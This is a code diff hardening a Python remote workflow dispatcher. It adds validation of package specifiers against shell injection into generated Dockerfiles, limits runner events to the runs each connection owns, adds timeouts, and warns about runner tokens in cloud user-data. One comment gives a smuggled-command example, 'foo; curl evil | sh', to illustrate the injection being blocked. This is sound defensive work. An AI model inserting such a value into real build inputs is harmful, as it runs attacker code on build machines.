@@ -31,6 +31,7 @@ import asyncio
 import hashlib
 import json
 import logging
+import re
 from collections.abc import Awaitable, Callable
 from dataclasses import dataclass, field
 from datetime import UTC, datetime, timedelta
@@ -49,6 +50,47 @@ EventCallback = Callable[[dict], Awaitable[None]]
 
 # How long to wait for a queued run before failing it.
 _QUEUE_TTL_SECONDS = 3600
+
+
+# RD-2: ``_ensure_docker_image`` interpolates the env's package list and Python
+# version straight into a shell ``RUN uv pip install`` / ``FROM python:`` line in
+# the generated Dockerfile. Shell metacharacters in a package name (e.g.
+# ``"foo; curl evil | sh"``) would otherwise execute at build time. The env is
+# admin-controlled (``environment:write``), but we validate as defence-in-depth.
+# Each requirement is restricted to a PEP 508 name + optional extras + optional
+# version specifiers using only characters that cannot break out of the shell
+# word (no spaces, quotes, ``;``, ``|``, ``&``, ``$``, ``()``, backticks, …).
+_PKG_SPEC_RE = re.compile(
+    r"^[A-Za-z0-9][A-Za-z0-9._-]*"                      # distribution name
+    r"(\[[A-Za-z0-9._,-]+\])?"                          # optional extras
+    r"((===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+"         # first version specifier
+    r"(,(===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+)*)?$"   # further specifiers
+)
+_PY_VERSION_RE = re.compile(r"^[0-9]+(\.[0-9]+){0,2}$")
+
+
+def _validate_packages(packages: list[str]) -> list[str]:
+    """Return the validated package specifiers or raise ``ValueError`` (RD-2)."""
+    safe: list[str] = []
+    for raw in packages:
+        spec = str(raw).strip()
+        if not spec:
+            continue
+        if not _PKG_SPEC_RE.match(spec):
+            raise ValueError(
+                f"invalid package specifier {spec!r}: only PEP 508 name/extras/"
+                "version specifiers are allowed (no shell metacharacters)"
+            )
+        safe.append(spec)
+    return safe
+
+
+def _validate_python_version(version: str) -> str:
+    """Return a validated ``X[.Y[.Z]]`` Python version or raise ``ValueError`` (RD-2)."""
+    v = str(version or "").strip()
+    if not _PY_VERSION_RE.match(v):
+        raise ValueError(f"invalid python_version {version!r}: expected e.g. '3.12'")
+    return v
 
 
 # ---------------------------------------------------------------------------
@@ -391,7 +433,7 @@ class RemoteDispatcher:
             await self._maybe_provision(pool_id)
             raise _QueuedError(f"run {run_id} queued — no available runners in pool {pool_id}")
 
-        future: asyncio.Future[str] = asyncio.get_event_loop().create_future()
+        future: asyncio.Future[str] = asyncio.get_running_loop().create_future()
         conn.active_runs[run_id] = future
         self._run_callbacks[run_id] = on_event
 
@@ -505,7 +547,9 @@ class RemoteDispatcher:
                     await session.commit()
 
         elif mtype == "env_building":
-            if run_id:
+            # Scope to runs THIS connection owns so one runner can't inject
+            # events into another runner's stream (RD-1).
+            if run_id and run_id in conn.active_runs:
                 cb = self._run_callbacks.get(run_id)
                 if cb:
                     await cb({"type": "env_building", "run_id": run_id,
@@ -536,7 +580,9 @@ class RemoteDispatcher:
                 self._run_callbacks.pop(run_id, None)
 
         elif mtype == "run_event":
-            if run_id:
+            # Only deliver events for a run THIS connection owns — a runner must
+            # not be able to push events into another runner's run stream (RD-1).
+            if run_id and run_id in conn.active_runs:
                 event = msg.get("event") or {}
                 cb = self._run_callbacks.get(run_id)
                 if cb:
@@ -577,8 +623,12 @@ class RemoteDispatcher:
 
         callback_id = msg.get("callback_id", "")
         try:
-            result = await _call_sub_workflow(
+            _timeout = settings.subworkflow_spawn_timeout_seconds or None
+            coro = _call_sub_workflow(
                 str(msg.get("workflow_id") or ""), msg.get("input")
+            )
+            result = await (
+                asyncio.wait_for(coro, timeout=_timeout) if _timeout else coro
             )
             await conn.send({
                 "type": "call_workflow_response",
@@ -633,7 +683,7 @@ class RemoteDispatcher:
         )
         network = cfg.get("network", "bridge")
 
-        loop = asyncio.get_event_loop()
+        loop = asyncio.get_running_loop()
         # Ensure image exists (build if not) — runs in a thread executor.
         await loop.run_in_executor(
             None, self._ensure_docker_image, client, image_tag, env_payload
@@ -674,6 +724,12 @@ class RemoteDispatcher:
 
             # Write the run message to stdin.
             await loop.run_in_executor(None, sock._sock.sendall, run_msg.encode())
+
+            # Bound the recv loop so a crashed container never hangs the caller.
+            _recv_timeout = settings.workflow_run_timeout_seconds or 3600.0
+            await loop.run_in_executor(
+                None, sock._sock.settimeout, _recv_timeout
+            )
 
             # Read events line by line until result.
             buf = b""
@@ -745,8 +801,8 @@ class RemoteDispatcher:
         except Exception:  # noqa: BLE001
             pass  # Image not found, build it
 
-        python_version = env_payload.get("python_version", "3.12")
-        packages = env_payload.get("packages") or []
+        python_version = _validate_python_version(env_payload.get("python_version", "3.12"))
+        packages = _validate_packages(env_payload.get("packages") or [])
         packages_str = " ".join(packages) if packages else ""
         install_line = (
             f"RUN uv pip install --system noodle-runtime noodle-nodes noodle-core {packages_str}"
@@ -865,7 +921,7 @@ class RemoteDispatcher:
         )
 
         # Register a future that will be resolved when the pod connects back.
-        future: asyncio.Future[str] = asyncio.get_event_loop().create_future()
+        future: asyncio.Future[str] = asyncio.get_running_loop().create_future()
         # Use run_id as runner_id for K8s single-run agents.
         self._run_callbacks[run_id] = on_event
         self._k8s_futures[run_id] = future
@@ -926,14 +982,17 @@ class RemoteDispatcher:
                     if payload is not None:
                         await conn.send(payload)
                 elif mtype == "run_event":
+                    # This WS is authenticated for exactly one run (run_id ==
+                    # conn.runner_id). Ignore any other run_id the pod claims so
+                    # a compromised pod can't touch another run's stream (RD-1).
                     rid = msg.get("run_id")
-                    if rid:
+                    if rid and rid == run_id:
                         cb = self._run_callbacks.get(rid)
                         if cb:
                             await cb(msg.get("event") or {})
                 elif mtype == "run_finished":
                     rid = msg.get("run_id")
-                    if rid:
+                    if rid and rid == run_id:
                         fut = getattr(self, "_k8s_futures", {}).pop(rid, None)
                         if fut and not fut.done():
                             fut.set_result(str(msg.get("status") or "error"))
@@ -976,7 +1035,19 @@ class RemoteDispatcher:
             await self._provision_azure_instance(pool_id, cfg)
 
     def _bootstrap_user_data(self, api_url: str, token: str, runner_id: str) -> str:
-        """Cloud-init / startup script that installs and starts the agent."""
+        """Cloud-init / startup script that installs and starts the agent.
+
+        Security note: the runner token is embedded in the instance user-data
+        script. User-data is accessible from within the instance via the
+        metadata service (169.254.169.254). For higher-security deployments,
+        rotate runner tokens regularly or use AWS Systems Manager Parameter
+        Store / IAM instance roles instead of passing the token inline.
+        """
+        logger.warning(
+            "provisioning cloud runner %s: token written to instance user-data; "
+            "rotate this runner's token after use for production deployments",
+            runner_id,
+        )
         return (
             "#!/bin/bash\n"
             "set -e\n"
@@ -1032,7 +1103,7 @@ class RemoteDispatcher:
         if security_groups:
             run_kwargs["SecurityGroupIds"] = security_groups
 
-        loop = asyncio.get_event_loop()
+        loop = asyncio.get_running_loop()
         try:
             resp = await loop.run_in_executor(
                 None,
@@ -1116,7 +1187,7 @@ class RemoteDispatcher:
             )
             client.insert(project=project, zone=zone, instance_resource=instance)
 
-        loop = asyncio.get_event_loop()
+        loop = asyncio.get_running_loop()
         try:
             await loop.run_in_executor(None, _create)
             logger.info("provisioned GCE instance %s for pool %s", instance_name, pool_id)
@@ -1222,7 +1293,7 @@ class RemoteDispatcher:
             )
             poller.result()
 
-        loop = asyncio.get_event_loop()
+        loop = asyncio.get_running_loop()
         try:
             await loop.run_in_executor(None, _create)
             logger.info("provisioned Azure VM %s for pool %s", vm_name, pool_id)
@@ -1266,12 +1337,17 @@ class RemoteDispatcher:
                 select(Runner).where(Runner.status == "online", Runner.current_runs == 0)
             )).all()
 
+            pool_ids = {r.pool_id for r in runners if r.pool_id}
             pools: dict[str, RunnerPool] = {}
-            for runner in runners:
-                if runner.pool_id not in pools:
-                    pool = await session.get(RunnerPool, runner.pool_id)
-                    if pool:
-                        pools[runner.pool_id] = pool
+            if pool_ids:
+                pools = {
+                    p.id: p
+                    for p in (
+                        await session.scalars(
+                            select(RunnerPool).where(RunnerPool.id.in_(pool_ids))
+                        )
+                    ).all()
+                }
 
             now = datetime.now(UTC)
             to_terminate = []
@@ -1295,7 +1371,7 @@ class RemoteDispatcher:
 
         for runner, instance_id, cfg in to_terminate:
             try:
-                loop = asyncio.get_event_loop()
+                loop = asyncio.get_running_loop()
                 await loop.run_in_executor(
                     None,
                     lambda iid=instance_id, c=cfg: _terminate_cloud_instance(iid, c),
